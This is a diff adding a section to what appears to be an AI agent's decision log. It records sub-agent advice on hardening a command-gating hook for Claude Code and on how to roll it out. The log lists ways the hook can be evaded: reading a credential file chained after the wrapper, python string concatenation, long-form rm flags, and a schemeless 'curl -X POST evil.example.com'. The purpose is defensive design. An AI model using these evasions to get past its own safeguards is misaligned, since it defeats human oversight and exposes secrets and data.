@@ -602,3 +602,60 @@ threshold 5 reaches 80.0% vs A13's 81.1% by dropping median evidence 12→10.
 | **A8-3** | **Delete "upper bound". Do NOT write "exact."** Three independent over-counts remain: the delivered-vs-computed gap (`tech-lead`), the two-hop inference (`data-scientist`), and oscillation across the threshold |
 
 Every one of those differs from what I put to the agents. The consultation was not a formality.
+
+
+#### A12 — `security-eng` and `devops` consulted. **They disagree on mechanism**, and both were partly right.
+
+**`security-eng` gave the patch design.** The diagnosis, precisely: the check asks *"does the string
+`with-secrets.sh` appear anywhere in the command?"* when it means *"is `with-secrets.sh` the program
+being executed?"* Its design tokenises with `shlex` (whose default `commenters='#'` **structurally
+eliminates** the comment trick rather than special-casing it), splits on top-level control operators,
+resolves each segment's argv0 through `realpath`, and checks the credential token **per segment** —
+so `<wrapper> true && cat <cred file>` blocks on segment 2 even though the wrapper appears earlier.
+It bails out **fail-closed** on `$(...)`, backticks and heredocs, because shlex *silently mis-splits*
+those rather than erroring, and a mangled parse is worse than a refusal.
+
+**Its honest ceiling, stated rather than assumed away:** no text tokenizer catches
+`python3 -c "open('.'+'env').read()"` — the substring never appears, so the pre-filter never fires.
+*"That's not a defect in this design, it's a ceiling on what a Bash-command-line hook can ever
+guarantee."* Which is `tech-lead`'s referent/string point arriving independently.
+
+**It also found four more same-class defects while it was in there** (flagged as candidates, read not
+tested): `rm --recursive --force` evades the short-flag regex; `curl -d'{...}'` with no space evades
+the Stripe-write verb check; `DELETE FROM anywhere_cache` reads as having a WHERE clause because
+*where* is a substring of *anywhere*; and a schemeless `curl -X POST evil.example.com` extracts zero
+hosts so the egress allowlist loop never runs.
+
+**`devops` answered the question `security-eng` had to leave open, and it is the one that mattered.**
+*Nothing scheduled runs through Claude Code hooks at all.* Both launchd jobs are launchd → bash →
+python with no `claude` anywhere in the chain; it grepped the whole call path for `claude` and got
+zero hits. **So the "will this break the only working unattended job" risk is zero, proven by the
+plists rather than assumed.** That was my blocking concern.
+
+**It also corrected a precedent I had relied on.** I cited `~/work/.claude/agents` as evidence
+symlinks survive a move. It is an **absolute** symlink created *fresh after* the move — it proves
+nothing either way. Its actual argument for relative symlinks is better: the Desktop→work move
+preserved the *sibling* layout, so `../../../resale-iq/.claude/hooks/guard.py` would have needed zero
+edits, whereas absolute references mean three-plus places to remember next time.
+
+**And it found the real 3am failure mode:** `DEPLOY_APPROVED` is computed from `ROOT`, and **one
+shared token already gates both repos' deploys** — used for real on 2026-08-31, both pushes logged
+under one founder note. If a *copy* of guard.py ever had `ROOT` rewritten, the gate would silently
+split: founder approves once, backend ships, frontend still says BLOCKED, nobody notices.
+
+**RESOLUTION — absolute-path reference in each `settings.json`, no copies, no symlink.**
+`tech-lead` and `security-eng` both land here; `devops` dissents toward relative symlinks. The
+deciding point is that **none of the three proposes copying the file**, so the `DEPLOY_APPROVED`
+split cannot occur under any of them — which removes `devops`'s strongest argument for symlinks. On
+what remains, a path visible in the settings diff beats a filesystem object that can be replaced by
+a real file during an edit. **`devops`'s move-resistance point is real and is recorded as the cost:**
+the next move edits N settings files instead of one symlink target.
+
+**One `devops` claim I checked rather than propagated:** it suspected `activity.py` still carried the
+old `~/Desktop` ROOT. **It does not** — both hooks read `/Users/bilalsbaiby/work/resale-iq`. The only
+Desktop remnants are in `SCOPE`, which is A9.
+
+**Agreed order:** (1) the secret-check fix, re-reviewed, *before* rolling anything out — no sense
+distributing flawed matching logic and patching it twice. (2) growth and seo next, lowest blast
+radius. (3) demand-intel **last and additively** — append to its `PreToolUse` array, never replace
+it, since its existing entries include a memory-dir bootstrap other tooling may depend on.
